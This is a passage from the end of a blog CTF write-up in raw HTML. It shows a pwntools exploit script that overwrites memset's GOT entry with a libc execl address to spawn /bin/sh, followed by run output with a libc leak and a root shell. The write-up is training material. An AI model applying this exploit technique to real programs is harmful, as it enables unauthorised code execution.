</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#payload += rot13_f( p32( libc_base + libc.symbols[&#39;execl&#39;]))</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> rot13_f( p32( libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;execl&#39;</span>]))
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#payload += rot13_f( p32( libc_base + libc.symbols[&#39;system&#39;]))</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>64</span><span style=color:#f92672>-</span>len(payload))
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x08</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#payload += b&#34;A&#34;*8</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p32( exe<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;memset&#39;</span>] )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;y&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>interactive()</span></span></code></pre></div><p>And when we run it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01_patched&#39;</span>: pid <span style=color:#ae81ff>373291</span>
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;resp: NNNN\x80\xbd\xf0\xf7\x87(\xad\xfb\xb8\x18\xeb\xff \xbe\xf2\xf7X\xab\xd9\xf7\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Leak puts+11 @  0xf7d9ab4b
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Libc base @ 0xf7d33000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Addr system @ 0xf7d70200
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Addr execl @ 0xf7df2870
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
</span></span><span style=display:flex><span>resp: <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>more? <span style=color:#f92672>(</span>y/n<span style=color:#f92672>)</span>: 
</span></span><span style=display:flex><span>size: data: resp: /ova/fu
</span></span><span style=display:flex><span>more? <span style=color:#f92672>(</span>y/n<span style=color:#f92672>)</span>: $ ls
</span></span><span style=display:flex><span>chall01  chall01_patched  core    ld-2.27.so  libc.so.6  solve.py  test.py
</span></span><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>chall01  chall01_patched  core    ld-2.27.so  libc.so.6  solve.py  test.py
</span></span><span style=display:flex><span>$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ 
</span></span></code></pre></div><p>That is all for this first challenge. Hope that you enjoyed it. Bye and See you next time for a new challenge.</p></div></article><div class="post-nav thin"><a class=next-post href=https://dilagluc.github.io/en/posts/2023/crypto/aes/intro-to-aes/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>Chiffrement AES</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2025 <a href=https://dilagluc.github.io/>Blog</a>
&#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>dilag</a>&#183; Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a>
&#183; Theme <a href=https://github.com/1bl4z3r/hermit-V2 target=_blank rel=noopener>Hermit-V2</a></p></footer><script async src=https://dilagluc.github.io/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin=anonymous></script><script async src=https://dilagluc.github.io/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin=anonymous></script></body></html>